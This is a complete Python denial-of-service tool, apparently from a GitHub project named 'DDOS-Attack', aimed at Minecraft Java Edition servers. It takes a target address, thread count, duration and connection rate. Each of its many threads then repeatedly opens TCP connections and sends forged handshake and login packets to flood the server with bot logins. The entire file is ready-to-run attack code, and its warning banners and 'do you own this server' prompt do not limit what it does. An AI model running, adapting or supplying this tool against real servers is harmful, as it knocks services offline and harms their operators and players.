import sys
import os
import time
import socket
import ipaddress
import random
import struct
import threading

# ==================== Startup ASCII Art & Legal Warning ====================

os.system("cls" if os.name == "nt" else "clear")
print("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   BC-809")
print("M       MMM M       MMM MMM     MMM MM       MM   BC-809")
print("M  MMMM   M M  MMMM   M M   MMM   M M  MMMMM  M   BC-809")
print("M  MMMMM  M M  MMMMM  M M  MMMMM  M M        MM   BC-809")
print("M  MMMMM  M M  MMMMM  M M  MMMMM  M MMMMMMM   M   BC-809")
print("M  MMMM   M M  MMMM   M M   MMM   M M   MMM   M   BC-809")
print("M        MM M        MM MMM     MMM MM       MM   BC-809")
print("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   BC-809")
print("SEVERE WARNING")
print("You have touched the legal and ethical boundary. Exit now, or wait 3 seconds.")
time.sleep(1)
print("3")
time.sleep(1)
print("2")
time.sleep(1)
print("1")
time.sleep(1)
print("Starting...")
time.sleep(2)

os.system("cls" if os.name == "nt" else "clear")
print(r" ____  ____   ___  ____          _   _   _             _     ")
print(r"|  _ \|  _ \ / _ \/ ___|        / \ | |_| |_ __ _  ___| | __ ")
print(r"| | | | | | | | | \___ \ _____ / _ \| __| __/ _` |/ __| |/ / ")
print(r"| |_| | |_| | |_| |___) |_____/ ___ \ |_| || (_| | (__|   <  ")
print(r"|____/|____/ \___/|____/     /_/   \_\__|\__\__,_|\___|_|\_\ ")
print("Author  : BCU-0")
print("GitHub  : https://github.com/BC-809/DDOS-Attack.git")
print("")
print("Minecraft Java Edition Bot Attack Module")
print("")

# ==================== Parameter Input ====================

# Target address input (supports domain:port or ip:port)
while True:
    addr_str = input("[?] Target server address (e.g. play.example.com:25565): ").strip()
    if not addr_str:
        print("[!] Address cannot be empty.")
        continue
    # Split domain and port
    if ":" in addr_str:
        try:
            host, port_str = addr_str.rsplit(":", 1)
            target_port = int(port_str)
        except ValueError:
            print("[!] Invalid port format. Use domain:port.")
            continue
    else:
        host = addr_str
        target_port = 25565  # Minecraft default port
    if not 1 <= target_port <= 65535:
        print("[!] Port must be between 1 and 65535.")
        continue
    # Try to resolve domain; save hostname for Handshake packet
    try:
        addr_info = socket.getaddrinfo(host, target_port, proto=socket.IPPROTO_TCP)
        target_ip = addr_info[0][4][0]  # take the first IP
        print(f"[*] Resolved: {host} -> {target_ip}:{target_port}")
        break
    except socket.gaierror as e:
        print(f"[!] Domain resolution failed: {e}")
        continue

# Attack parameters
while True:
    try:
        threads_str = input("[?] Number of attack threads (suggest 100-500): ").strip()
        threads_count = int(threads_str)
        if threads_count <= 0:
            print("[!] Thread count must be positive.")
            continue
        break
    except ValueError:
        print("[!] Please enter a valid integer.")

while True:
    try:
        duration_str = input("[?] Attack duration (seconds): ").strip()
        duration = float(duration_str)
        if duration <= 0:
            print("[!] Duration must be positive.")
            continue
        break
    except ValueError:
        print("[!] Please enter a valid number.")

# Connection rate (connections per second per thread)
conn_rate = 10.0
try:
    rate_str = input(f"[?] Connections per second per thread (default {conn_rate}): ").strip()
    if rate_str:
        conn_rate = float(rate_str)
except ValueError:
    conn_rate = 10.0

print(f"\n[*] Attack target: {host} ({target_ip}:{target_port})")
print(f"[*] Threads: {threads_count}")
print(f"[*] Duration: {duration} seconds")
print(f"[*] Connections per second per thread: {conn_rate}")

# ==================== Minecraft Protocol Packet Construction ====================

# Protocol version (1.18.1 = 757, 1.19 = 759, 1.20.4 = 765) 757 is common
PROTOCOL_VERSION = 757

def create_handshake_packet(host, port, next_state=2):
    """
    Build a Minecraft Handshake packet.
    next_state: 1 = status, 2 = login
    """
    host_bytes = host.encode('utf-8')
    packet = bytearray()
    # Packet ID (0x00)
    packet.append(0x00)
    # Protocol Version (varint)
    packet.extend(encode_varint(PROTOCOL_VERSION))
    # Server Address (string)
    packet.extend(encode_string(host_bytes))
    # Server Port (unsigned short)
    packet.extend(struct.pack('>H', port))
    # Next State (varint)
    packet.extend(encode_varint(next_state))
    # Wrap as Minecraft frame (length prefix)
    return pack_mc_frame(bytes(packet))

def create_login_start_packet(username="Bot"):
    """Build a Login Start packet"""
    packet = bytearray()
    packet.append(0x00)  # Packet ID
    packet.extend(encode_string(username.encode('utf-8')))
    return pack_mc_frame(bytes(packet))

def encode_varint(value):
    """Encode an integer as a Minecraft VarInt"""
    buf = bytearray()
    while True:
        temp = value & 0x7f
        value >>= 7
        if value != 0:
            temp |= 0x80
        buf.append(temp)
        if value == 0:
            break
    return bytes(buf)

def encode_string(data: bytes):
    """Encode bytes as a Minecraft string (length prefix + content)"""
    length = encode_varint(len(data))
    return bytes(length) + data

def pack_mc_frame(packet_data: bytes):
    """Add Minecraft frame length prefix (VarInt) to the packet"""
    length = encode_varint(len(packet_data))
    return bytes(length) + packet_data

# ==================== Attack Thread ====================

stop_event = threading.Event()

def attack_thread(host, port, ip, rate):
    """Single attack thread: repeatedly create TCP connections and send login packets"""
    sock = None
    while not stop_event.is_set():
        try:
            # Create TCP connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            # Send Handshake + Login Start
            handshake = create_handshake_packet(host, port, 2)
            login_start = create_login_start_packet()
            sock.send(handshake + login_start)
            # Keep connection briefly, or close immediately
            time.sleep(0.1)
        except Exception:
            pass
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass
            # Control connection rate
            time.sleep(1.0 / rate if rate > 0 else 0.1)

# ==================== Final Confirmation ====================

print("\n[!] FINAL WARNING: You are about to launch a bot attack against the target Minecraft server.")
while True:
    confirm = input("Confirm this is a server you own and have legal authorization for (yes/no): ").strip().lower()
    if confirm == 'yes':
        break
    elif confirm == 'no':
        print("[*] Cancelled by user.")
        sys.exit(0)
    else:
        print("[!] Please enter yes or no.")

# ==================== Start Attack ====================

print(f"\n[*] Starting {threads_count} attack threads...")
threads = []
for _ in range(threads_count):
    t = threading.Thread(target=attack_thread, args=(host, target_port, target_ip, conn_rate))
    t.daemon = True
    t.start()
    threads.append(t)

print(f"[*] Attack started, lasting {duration} seconds. Press Ctrl+C to stop early...")
try:
    time.sleep(duration)
except KeyboardInterrupt:
    print("\n[!] Interrupt signal received.")
finally:
    stop_event.set()
    print("[*] Waiting for all threads to exit...")
    for t in threads:
        t.join(timeout=2)
    print("[+] Attack finished.")
